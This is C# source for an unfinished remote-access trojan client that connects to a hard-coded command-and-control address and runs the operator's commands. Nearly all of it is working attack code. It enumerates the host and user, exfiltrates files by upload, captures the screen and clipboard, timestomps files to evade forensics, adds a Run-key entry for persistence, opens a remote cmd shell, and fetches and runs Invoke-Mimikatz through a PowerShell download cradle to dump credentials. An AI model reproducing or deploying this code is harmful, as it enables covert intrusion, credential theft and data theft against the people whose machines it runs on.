// work in progress
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Collections;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Workflow.Activities;
using System.Threading;
//using Microsoft.Win32.TaskScheduler;

namespace rnrclient
{
    public class Program
    {
        // GLOBALS
        static string server = "172.16.80.129";
        static Int32 port = 9999;
        static TcpClient client = new TcpClient(server, port);

        // MAIN
        public static void Main()
        {
            NetworkStream stream = connect();
            while (true)
            {
                try
                {
                    String responseData = get_stream_data(stream);
                    Console.WriteLine("[+] Received Command from {1}: {0}", responseData, server);
                    string[] args = responseData.Split();
                    parse_cmd(args, stream);
                }
                catch (Exception e)
                {
                    TimeSpan interval = new TimeSpan(0, 0, 10);
                    Thread.Sleep(interval);
                    Console.WriteLine("[-] Connection Failed!");
                    Console.WriteLine("[+] Trying again!");
                }
            }
            
        }

        // ESTABLISH CONNECTION
        static NetworkStream connect()
        {
            while (true)
            {
                try
                {
                    NetworkStream stream = client.GetStream();
                    return stream;
                }
                catch (Exception e)
                {
                    // Error connecting
                }

            }
        }

        // GET DATA
        static string get_stream_data(NetworkStream stream)
        {
            Byte[] data = new Byte[1024];
            String responseData = String.Empty;
            Int32 bytes = stream.Read(data, 0, data.Length);
            responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
            return responseData;
        }

        // PARSE C2 COMMANDS
        static void parse_cmd(string[] args, NetworkStream stream)
        {
            try
                {
                if (args[0] == "hostinfo")
                {
                    send(hostinfo());
                }
                else if (args[0] == "userinfo")
                {
                    send(userinfo());
                }
                else if (args[0] == "shares")
                {
                    send(shares());
                }
                else if (args[0] == "ps")
                {
                    send(ps());
                }
                else if (args[0] == "envar")
                {
                    send(envar());
                }
                else if (args[0] == "dld")
                {
                    if (args.Length != 3)
                    {
                        send("Requires 2 arguments!");
                    }
                    else
                    {
                        send(dld(args[1], args[2]));
                    }

                }
                else if (args[0] == "xfil")
                {
                    xfil(args[1], args[2]);
                }
                else if (args[0] == "ts")
                {
                    ts(args[1]);
                }
                else if (args[0] == "listdir")
                {
                    if (args.Length != 2)
                    {
                        send("Requires 1 argument!");
                    }
                    else
                    {
                        send(listdir(args[1]));
                    }
                }
                else if (args[0] == "pwd")
                {
                    send(pwd());
                }
                else if (args[0] == "mkdir")
                {
                    send(mkdir(args[1]));
                }
                else if (args[0] == "mv")
                {
                    send(mv(args[1], args[2]));
                }
                else if (args[0] == "cp")
                {
                    send(cp(args[1], args[2]));
                }
                else if (args[0] == "del")
                {
                    send(del(args[1]));
                }
                else if (args[0] == "deldir")
                {
                    send(deldir(args[1]));
                }
                else if (args[0] == "run")
                {
                    if (args.Length != 2)
                    {
                        send("Requires 2 arguments!");
                    }
                    else
                    {
                        send(run(args[1]));
                    }

                }
                else if (args[0] == "runadmin")
                {
                    if (args.Length != 2)
                    {
                        send("Requires one argument!");
                    }
                    else
                    {
                        runadmin(args[1]); // fix this function
                    }
                }
                else if (args[0] == "arch")
                {
                    if (args.Length != 3)
                    {
                        send("Requires 2 arguments!");
                    }
                    else
                    {
                        send(arch(args[1], args[2]));
                    }
                }
                else if (args[0] == "screencap")
                {
                    try
                    {
                        sendfile(screencap());
                    }
                    catch (Exception e)
                    {
                        send("Failed to send screencap!");
                    }
                }
                else if (args[0] == "getfile")
                {
                    sendfile(args[1]);
                }
                else if (args[0] == "drop")
                {
                    //downloadfile(args[1]);
                }
                else if (args[0] == "persist")
                {
                    send(runkey());
                }
                else if (args[0] == "mimi")
                {
                    mimikatz();
                }
                else if (args[0] == "cat")
                {
                    send(cat(args[1]));
                }
                else if (args[0] == "clip")
                {
                    send(clip());
                }
                else if (args[0] == "cmd")
                {
                    cmd(args[1]);
                }
                else if (args[0] == "file")
                {

                }
                else if (args[0] == "exit")
                {
                    stream.Close();
                    client.Close();
                    return;
                }
                else
                {
                    send("Command not recognized....\n");
                }
        }

                catch (Exception e)
                {
                    send("Error! Double check command!");
                }
        }

        // THINGS
        static void send(string s)
        {
            NetworkStream stream = client.GetStream();
            byte[] send = System.Text.Encoding.ASCII.GetBytes(s);
            stream.Write(send, 0, send.Length);
        }
        static void sendfile(string path)
        {
            NetworkStream stream = client.GetStream();
            byte[] file = System.IO.File.ReadAllBytes(path);
            stream.Write(file, 0, file.Length);
        }

        static string hostinfo()
        {
            try
            {
                string hostName = Dns.GetHostName();
                string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
                StringBuilder response = new StringBuilder();
                response.Append("IP: " + ip);
                response.Append("\nHostname: " + System.Environment.MachineName);
                response.Append("\nMAC: ");
                string Query2 = "SELECT * FROM win32_networkadapterconfiguration";
                ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(Query2);
                var mac = "";
                foreach (ManagementObject nic in searcher2.Get())
                {
                    mac = Convert.ToString(nic.Properties["MACAddress"].Value);
                    if (mac.Length <= 17 && mac.Length != 0 && mac != Convert.ToString(nic.Properties["MACAddress"].Value))
                    {
                        response.AppendLine(mac);
                    }

                }
                response.Append("\nProcessor Count: " + System.Environment.ProcessorCount);
                response.Append("\n64-bit: " + System.Environment.Is64BitOperatingSystem);
                var logicaldrives = Environment.GetLogicalDrives();
                string drives = "";
                foreach (string drive in logicaldrives)
                {
                    drives += drive + ", ";
                }
                response.Append("\nLogical Drive: " + drives);
                string Query = "SELECT Capacity FROM Win32_PhysicalMemory";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
                UInt64 Capacity = 0;
                foreach (ManagementObject WniPART in searcher.Get())
                {
                    Capacity += Convert.ToUInt64(WniPART.Properties["Capacity"].Value);
                }
                response.Append("\nTotal RAM: " + Capacity);
                response.Append("\n");
                return response.ToString();
            }
            catch (Exception e)
            {
                return "Failed to find host information!";
            }
        }

        static string userinfo()
        {
            try
            {
                StringBuilder response = new StringBuilder();
                response.Append("Username: " + Environment.UserName);
                response.Append("\nDomain\\Username: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name);
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
                    response.Append("\nAdmin: " + admin);
                }
                response.Append("\n");
                return response.ToString();
            }
            catch (Exception e)
            {
                return "Failed to pull user information!";
            }
        }

        static string shares()
        {
            try
            {
                StringBuilder response = new StringBuilder();
                var wmiPath = string.Format(@"\\{0}\root\cimv2", System.Environment.MachineName);
                var wql = "select * FROM Win32_Share";
                var searcher = new ManagementObjectSearcher(wmiPath, wql);
                var shares = searcher.Get();
                response.Append("\nShares:");
                foreach (var share in shares)
                {
                    response.Append("\n{0}" + share);
                }
                var wql2 = "select * FROM Win32_MappedLogicalDisk";
                var searcher2 = new ManagementObjectSearcher(wmiPath, wql2);
                var netShares = searcher2.Get();
                if (netShares is null)
                {
                    response.Append("\nNo Mapped Drives!");
                }
                else
                {
                    response.Append("\nMapped Drives:\n");
                    foreach (var share2 in netShares)
                    {
                        response.Append("\n{0}");
                    }
                }
                return response.ToString();
            }
            catch (Exception e)
            {
                return "Failed to enumerate shares!";
            }
        }

        static string ps()
        {
            StringBuilder allProcesses = new StringBuilder();
            allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
            Process[] processList = Process.GetProcesses();
            foreach (Process process in processList)
            {
                string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
                allProcesses.Append(processInfo);
            }
            return allProcesses.ToString();
        }

        static string envar()
        {
            StringBuilder response = new StringBuilder();
            var envar = Environment.GetEnvironmentVariables();
            foreach (DictionaryEntry i in envar)
            {
                response.Append(i.Key + ": " + i.Value + "\n");
            }
            return response.ToString();
        }

        static string dld(string path, string uri)
        {
            try
            {
                var wc = new System.Net.WebClient();
                wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
                Uri u = new Uri(uri);
                wc.DownloadFile(u, path);
                return "Download successful.";
            }
            catch (Exception e)
            {
                return "Download failed!";
            }
        }

        static string xfil(string path, string uri)
        {
            try
            {
                var wc = new System.Net.WebClient();
                Uri u = new Uri(uri);
                wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
                wc.UploadFile(u, path);
                return "Exfil succesul.";
            }
            catch (Exception e)
            {
                return "Exfil failed!";
            }
        }

        static string ts(string path)
        {
            try
            {
                System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
                System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
                System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
                return "Successfully timestomped: " + path;
            }
            catch (Exception e)
            {
                return "Failed to timestomp!";
            }
        }

        static string listdir(string path)
        {
            try
            {
                var files = System.IO.Directory.EnumerateFiles(path);
                var f = "";
                foreach (string file in files)
                {
                    f += "\n" + file;
                }
                var directories = System.IO.Directory.EnumerateDirectories(path);
                foreach (string directory in directories)
                {
                    f += "\n" + directory;
                }
                var list = f.Split();
                List<string> result = f.Split('\n').ToList();
                result.Sort();
                StringBuilder response = new StringBuilder();
                foreach (var item in result)
                {
                    response.Append(item + "\n");
                }
                return response.ToString();
            }
            catch (Exception e)
            {
                return "Failed to enumerate directory " + path;
            }
        }

        static string pwd()
        {
            try
            {
                return Environment.CurrentDirectory;
            }
            catch (Exception e)
            {
                return "Failed to get current working directory!";
            }
        }

       static string cd()
        {

            return "yo";
        }

        static string mkdir(string dir)
        {
            try
            {
                System.IO.Directory.CreateDirectory(dir);
                return "Successfully created: " + dir;
            }
            catch (Exception e)
            {
                return "Failed to create directory " + dir;
            }
        }

        static string mv(string src, string dest)
        {
            try
            {
                System.IO.File.Move(src, dest);
                return "Successfully moved " + src + " to " + dest;
            }
            catch (Exception e)
            {
                return "Failed to move file!" + e;
            }
        }

        static string cp(string src, string dest)
        {
            try
            {
                System.IO.File.Copy(src, dest);
                return "Successfully copied file.";
            }
            catch (Exception e)
            {
                return "Failed to copy file!";
            }
        }

        static string del(string path)
        {
            try
            {
                System.IO.File.Delete(path);
                return path + " successfully deleted.";
            }
            catch (Exception e)
            {
                return "Failed to delete " + path;
            }
        }

        static string deldir(string path)
        {
            try
            {
                System.IO.Directory.Delete(path);
                return path + " successfully deleted.";
            }
            catch (Exception e)
            {
                return "Failed to delete " + path;
            }
        }

        static string arch(string src, string dest)
        {
            try
            {
                System.IO.Compression.ZipFile.CreateFromDirectory(src, dest);
                return dest + " successfully created!";
            }
            catch (Exception e)
            {
                return "Failed to create archive!";
            }
        }

        static string cat(string path)
        {
            try
            {
                return System.IO.File.ReadAllText(path);
            }
            catch (Exception e)
            {
                return "File not found!:";
            }
        }

        static string screencap()
        {
            try
            {
                Bitmap screencap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(screencap as Image);
                graphics.CopyFromScreen(0, 0, 0, 0, screencap.Size);
                var temp = System.IO.Path.GetTempFileName();
                screencap.Save(temp, ImageFormat.Jpeg);
                return temp;
            }
            catch (Exception e)
            {
                return "Failed to capture screen!";
            }
        }

        static string drop(string path)
        {
            try
            {

                return path + " successfully downloaded.";
            }
            catch (Exception e)
            {
                return "Failed to download file!";
            }
        }

        static string run(string proc)
        {
            try
            {
                Process.Start(proc);
                return proc + " successfully started.";
            }
            catch (Exception e)
            {
                return "Failed to start process!";
            }
        }

        private static bool runadmin(string proc)
        {
            var SelfProc = new ProcessStartInfo
            {
                UseShellExecute = true,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = proc,
                Verb = "runas",
            };
            try
            {
                Process.Start(SelfProc);
                return true;
            }
            catch
            {
                Console.WriteLine("Insufficient privs.....");
                return false;
            }
        }

        static string runkey()
        {
            try
            {
                var split = Environment.CommandLine.Split();
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "rnrget", split[0]);
                return "Successfully created regitstry entry.";
            }
            catch (Exception e)
            {
                return "Failed to create registry entry!";
            }
        }

        static void fix_me(string type)
        {
            var split = Environment.CommandLine.Split();
            var path = split[0];
            if (type == "logonscript")
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript", "rnrget", path);
            }
            else if (type == "startup")
            {
                System.IO.File.Copy(path, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\rnrget.exe");
            }
            else if (type == "schtask")
            {
                //
            }
        }

        static void mimikatz()
        {
            string args = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m";
            ProcessStartInfo psinfo = new ProcessStartInfo("powershell.exe");
            psinfo.WindowStyle = ProcessWindowStyle.Normal;
            psinfo.Arguments = args;
            Process.Start(psinfo);
        }

        static string clip()
        {
            return System.Windows.Forms.Clipboard.GetText();
        }

        static void cmd(string args)
        {
            Stream stream = client.GetStream();
            StreamReader sr = new StreamReader(stream);
            StreamWriter sw = new StreamWriter(stream);
            StringBuilder sb = new StringBuilder();
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.Arguments = "/c " + args;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();

            while (true)
            {
                sb.Append(sr.ReadLine());
                p.StandardInput.WriteLine(sb);
                sb.Remove(0, sb.Length);
            }
        }

        /*
        static void downloadfile(string path)
        {
            NetworkStream stream = client.GetStream();
            Byte[] data = new byte[1024];
            Int32 bytes = 0;
            int offset = 0;
            while (data !< 1024)
            {
                stream.Read(data, 0, 1024);
                string resp = System.Text.Encoding.ASCII.GetString(data);
                var args = resp.Split();
                long size = long.Parse(args[1]);
                Console.WriteLine("Size of payload: " + size.ToString());
                try
                {
                    bytes += stream.Read(data, offset, data.Length);
                    offset += data.Length;
                    if (data.Length < 1024)
                    {
                        break;
                    }
                }
                catch (Exception e)
                {
                    send("Failed to download file!");
                }

            }
            try
            {
                System.IO.File.WriteAllBytes(path, data);
                send("File successfully downloaded!");
            }
            catch (Exception e)
            {
                send("Failed to write file!");
            }

        }
*/
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    Stream stream = client.GetStream();
                    StreamWriter sw = new StreamWriter(stream);
                    strOutput.Append(outLine.Data);
                    sw.WriteLine(strOutput);
                    sw.Flush();
                }
                catch (Exception e) { }
            }
        }
    }
}
